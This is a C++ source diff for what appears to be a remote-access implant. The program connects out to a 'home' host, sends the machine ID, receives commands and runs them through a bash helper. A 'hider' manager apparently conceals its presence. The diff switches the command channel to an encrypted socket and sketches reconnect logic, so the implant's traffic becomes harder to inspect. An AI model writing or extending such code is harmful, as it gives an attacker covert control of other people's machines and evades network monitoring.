@@ -10,21 +10,22 @@
 #include "Listener.h"
 #include "Connection.h"
 #include "SocketConnection.h"
+#include "EncSocketConnection.h"
 #include "../IncludeCPP/globalDefines.h"
 #include "../IncludeCPP/getBasicInfo.h"
 
 #define PORT (65432)
 
-void loopIter(std::shared_ptr<SocketConnection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
+void loopIter(std::shared_ptr<EncSocketConnection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
 
-int initRun(std::shared_ptr<SocketConnection> conn);
+int initRun(std::shared_ptr<EncSocketConnection> conn);
 
 int main() {
     std::cout << "started maneger\n";
     SoftwareManeger swm = SoftwareManeger();
     HiderManeger& hiderManager = HiderManeger::getInstance();
-    std::shared_ptr<SocketConnection> conn;
-    if (SocketConnection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+    std::shared_ptr<EncSocketConnection> conn;
+    if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
         std::cerr << "Maneger: Connection home failed\n";
         exit(EXIT_FAILURE);
     }
@@ -36,6 +37,12 @@ int main() {
     {
         loopIter(conn, swm, hiderManager);
         std::cout << "compleated loop iter\n";
+        // if (conn->checkShutdown()) {
+        //     if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+        //         std::cerr << "Maneger: Connection home failed after shutDown\n";
+        //         exit(EXIT_FAILURE);
+        //     }
+        // }
     }
 
     return EXIT_SUCCESS;
@@ -43,7 +50,7 @@ int main() {
 
 // perform stuff after connection to home creation
 // meant for sending information required for operation
-int initRun(std::shared_ptr<SocketConnection> conn) {
+int initRun(std::shared_ptr<EncSocketConnection> conn) {
 
 
     if (conn->sendString(getMachineID(), true) == false) {
@@ -71,7 +78,7 @@ std::string execBash(const char* cmd) {
 }
 
 
-void loopIter(std::shared_ptr<SocketConnection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
+void loopIter(std::shared_ptr<EncSocketConnection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
 {
     // receive command
     Status res = DID_NOTHING;
@@ -114,7 +121,9 @@ void loopIter(std::shared_ptr<SocketConnection> conn, SoftwareManeger& swm, Hide
     }
     
     // TODO change such that there will be response only if we want it to be 
-    conn->flushInput();
-    std::cout << "Conn: res-" << res << " response-\n" << strRes << std::endl;
+    // conn->flushInput();
+    std::cout << "maneger: input flushed\n";
+    std::cout << "Conn: res-" << res << "\nresponse-" << strRes << std::endl;
     conn->sendResponce(res, strRes);
+    std::cout << "\n\n";
 }
